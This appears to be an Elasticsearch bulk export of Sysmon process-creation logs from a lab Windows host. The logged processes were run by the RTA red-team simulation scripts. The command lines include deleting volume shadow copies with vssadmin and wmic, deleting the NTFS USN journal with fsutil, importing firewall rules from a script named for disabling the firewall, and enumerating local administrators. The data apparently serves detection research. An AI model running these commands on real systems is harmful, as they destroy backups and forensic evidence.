{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"v1_z8WUBfVn9xHWirDtS"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","LogonId":"0xe320","User":"flare-PC\\flare","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Image":"C:\\Windows\\SysWOW64\\cmd.exe","UtcTime":"2018-09-19 13:09:08.248","Product":"Betriebssystem Microsoft® Windows®","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","ParentProcessId":"3756","ProcessId":"3832","Company":"Microsoft Corporation","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py\"","Description":"Windows-Befehlsprozessor","ProcessGuid":"{2D3B23BE-4A74-5BA2-0000-001031900D00}"},"@timestamp":"2018-09-19T13:09:08.513Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:08.248\nProcessGuid: {2D3B23BE-4A74-5BA2-0000-001031900D00}\nProcessId: 3832\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","task":"Process Create (rule: ProcessCreate)","record_number":"1207","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"event_id":1,"version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"wF_z8WUBfVn9xHWirDtS"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00101AC10D00}","Product":"Microsoft® Windows® Operating System","User":"flare-PC\\flare","Image":"C:\\Windows\\SysWOW64\\net1.exe","LogonId":"0xe320","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","UtcTime":"2018-09-19 13:09:08.794","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentCommandLine":"net localgroup administrators","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","Company":"Microsoft Corporation","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3728","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"1440","CommandLine":"C:\\Windows\\system32\\net1 localgroup administrators","Description":"Net Command","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4A74-5BA2-0000-001035C20D00}"},"@timestamp":"2018-09-19T13:09:08.794Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:08.794\nProcessGuid: {2D3B23BE-4A74-5BA2-0000-001035C20D00}\nProcessId: 3728\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 localgroup administrators\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00101AC10D00}\nParentProcessId: 1440\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net localgroup administrators","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1211","host":{"name":"flare-PC"},"type":"wineventlog","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"wl_z8WUBfVn9xHWirDtS"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:07.061","ParentProcessGuid":"{2D3B23BE-4A72-5BA2-0000-00101BFC0C00}","Description":"WMI-Befehlszeilendienstprogramm","Hashes":"MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81","Image":"C:\\Windows\\SysWOW64\\wbem\\WMIC.exe","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py","Company":"Microsoft Corporation","CommandLine":"wmic.exe shadowcopy delete /nointeractive","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3872","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","IntegrityLevel":"Medium","TerminalSessionId":"1","ParentProcessId":"788","Product":"Betriebssystem Microsoft® Windows®","ProcessGuid":"{2D3B23BE-4A73-5BA2-0000-0010202A0D00}"},"@timestamp":"2018-09-19T13:09:07.077Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:07.061\nProcessGuid: {2D3B23BE-4A73-5BA2-0000-0010202A0D00}\nProcessId: 3872\nImage: C:\\Windows\\SysWOW64\\wbem\\WMIC.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: WMI-Befehlszeilendienstprogramm\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: wmic.exe shadowcopy delete /nointeractive\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81\nParentProcessGuid: {2D3B23BE-4A72-5BA2-0000-00101BFC0C00}\nParentProcessId: 788\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","task":"Process Create (rule: ProcessCreate)","event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"record_number":"1196","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"0F_z8WUBfVn9xHWirDtT"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Betriebssystem Microsoft® Windows®","Hashes":"MD5=784A50A6A09C25F011C3143DDD68E729,SHA256=661F5D4CE4F0A6CB32669A43CE5DEEC6D5A9E19B2387F22C5012405E92169943","Image":"C:\\Windows\\SysWOW64\\netsh.exe","ParentProcessGuid":"{2D3B23BE-4A73-5BA2-0000-00100C3A0D00}","Description":"Netzwerkbefehlsshell","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\disable_windows_fw.py","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","TerminalSessionId":"1","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"3488","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","CommandLine":"netsh.exe advfirewall import C:\\Users\\flare\\Downloads\\RTA-master\\fw.rules","Company":"Microsoft Corporation","ProcessId":"3708","IntegrityLevel":"Medium","UtcTime":"2018-09-19 13:09:08.154","ProcessGuid":"{2D3B23BE-4A74-5BA2-0000-001062880D00}"},"@timestamp":"2018-09-19T13:09:08.482Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:08.154\nProcessGuid: {2D3B23BE-4A74-5BA2-0000-001062880D00}\nProcessId: 3708\nImage: C:\\Windows\\SysWOW64\\netsh.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Netzwerkbefehlsshell\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: netsh.exe advfirewall import C:\\Users\\flare\\Downloads\\RTA-master\\fw.rules\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=784A50A6A09C25F011C3143DDD68E729,SHA256=661F5D4CE4F0A6CB32669A43CE5DEEC6D5A9E19B2387F22C5012405E92169943\nParentProcessGuid: {2D3B23BE-4A73-5BA2-0000-00100C3A0D00}\nParentProcessId: 3488\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\disable_windows_fw.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"record_number":"1206","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"0V_z8WUBfVn9xHWirDtT"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:09:08.779","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","Image":"C:\\Windows\\SysWOW64\\net.exe","Description":"Net Command","User":"flare-PC\\flare","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","LogonId":"0xe320","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"1440","TerminalSessionId":"1","IntegrityLevel":"Medium","CommandLine":"net localgroup administrators","ParentProcessId":"2304","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00101AC10D00}"},"@timestamp":"2018-09-19T13:09:08.779Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:08.779\nProcessGuid: {2D3B23BE-4A74-5BA2-0000-00101AC10D00}\nProcessId: 1440\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net localgroup administrators\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"record_number":"1210","version":5,"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"tF_z8WUBfVn9xHWikjtq"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","User":"flare-PC\\flare","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:09:01.144","Description":"Windows-Befehlsprozessor","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Image":"C:\\Windows\\SysWOW64\\cmd.exe","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","Company":"Microsoft Corporation","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py\"","ParentProcessId":"3756","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","ProcessId":"3096","LogonId":"0xe320","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4A6D-5BA2-0000-001089CB0C00}"},"@timestamp":"2018-09-19T13:09:01.144Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:01.144\nProcessGuid: {2D3B23BE-4A6D-5BA2-0000-001089CB0C00}\nProcessId: 3096\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1190","version":5,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"tl_z8WUBfVn9xHWikjtq"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A6D-5BA2-0000-0010EACC0C00}","Product":"Betriebssystem Microsoft® Windows®","User":"flare-PC\\flare","Image":"C:\\Windows\\SysWOW64\\fsutil.exe","LogonId":"0xe320","Hashes":"MD5=B4834F08230A2EB7F498DE4E5B6AB814,SHA256=C516C131D30436F8170A5A342B576BB82043576BC2BE5D1FDC5A19D482016604","UtcTime":"2018-09-19 13:09:01.566","FileVersion":"6.1.7601.17577 (win7sp1_gdr.110310-1504)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"fsutil usn deletejournal /d C:","ParentProcessId":"2876","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3428","Company":"Microsoft Corporation","IntegrityLevel":"Medium","TerminalSessionId":"1","Description":"fsutil.exe","ProcessGuid":"{2D3B23BE-4A6D-5BA2-0000-0010DCF70C00}"},"@timestamp":"2018-09-19T13:09:01.582Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:01.566\nProcessGuid: {2D3B23BE-4A6D-5BA2-0000-0010DCF70C00}\nProcessId: 3428\nImage: C:\\Windows\\SysWOW64\\fsutil.exe\nFileVersion: 6.1.7601.17577 (win7sp1_gdr.110310-1504)\nDescription: fsutil.exe\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: fsutil usn deletejournal /d C:\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B4834F08230A2EB7F498DE4E5B6AB814,SHA256=C516C131D30436F8170A5A342B576BB82043576BC2BE5D1FDC5A19D482016604\nParentProcessGuid: {2D3B23BE-4A6D-5BA2-0000-0010EACC0C00}\nParentProcessId: 2876\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1192","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"u1_z8WUBfVn9xHWioju3"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:09:06.952","Hashes":"MD5=6E248A3D528EDE43994457CF417BD665,SHA256=E09BF4D27555EC7567A598BA89CCC33667252CEF1FB0B604315EA7562D18AD10","Image":"C:\\Windows\\SysWOW64\\vssadmin.exe","Description":"Befehlszeilenschnittelle für Microsoft® Volumeschattenkopie-Dienst ","ParentProcessGuid":"{2D3B23BE-4A72-5BA2-0000-00101BFC0C00}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","TerminalSessionId":"1","CommandLine":"vssadmin.exe delete shadows /for=c: /oldest /quiet","ParentProcessId":"788","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2136","User":"flare-PC\\flare","IntegrityLevel":"Medium","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ProcessGuid":"{2D3B23BE-4A72-5BA2-0000-00101E270D00}"},"@timestamp":"2018-09-19T13:09:06.967Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:06.952\nProcessGuid: {2D3B23BE-4A72-5BA2-0000-00101E270D00}\nProcessId: 2136\nImage: C:\\Windows\\SysWOW64\\vssadmin.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Befehlszeilenschnittelle für Microsoft® Volumeschattenkopie-Dienst \nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: vssadmin.exe delete shadows /for=c: /oldest /quiet\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E248A3D528EDE43994457CF417BD665,SHA256=E09BF4D27555EC7567A598BA89CCC33667252CEF1FB0B604315EA7562D18AD10\nParentProcessGuid: {2D3B23BE-4A72-5BA2-0000-00101BFC0C00}\nParentProcessId: 788\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1195","event_id":1,"type":"wineventlog","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"-l_08WUBfVn9xHWiYjuN"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:51.157","ParentProcessGuid":"{2D3B23BE-4A9F-5BA2-0000-001060831100}","Description":"?","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Product":"?","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py\"","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Company":"?","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3096","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py","IntegrityLevel":"Medium","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"3812","ProcessGuid":"{2D3B23BE-4A9F-5BA2-0000-0010A9841100}"},"@timestamp":"2018-09-19T13:09:51.157Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:51.157\nProcessGuid: {2D3B23BE-4A9F-5BA2-0000-0010A9841100}\nProcessId: 3096\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4A9F-5BA2-0000-001060831100}\nParentProcessId: 3812\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py\"","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1255","task":"Process Create (rule: ProcessCreate)","version":5,"host":{"name":"flare-PC"},"event_id":1,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"-1_08WUBfVn9xHWiYjuO"}}
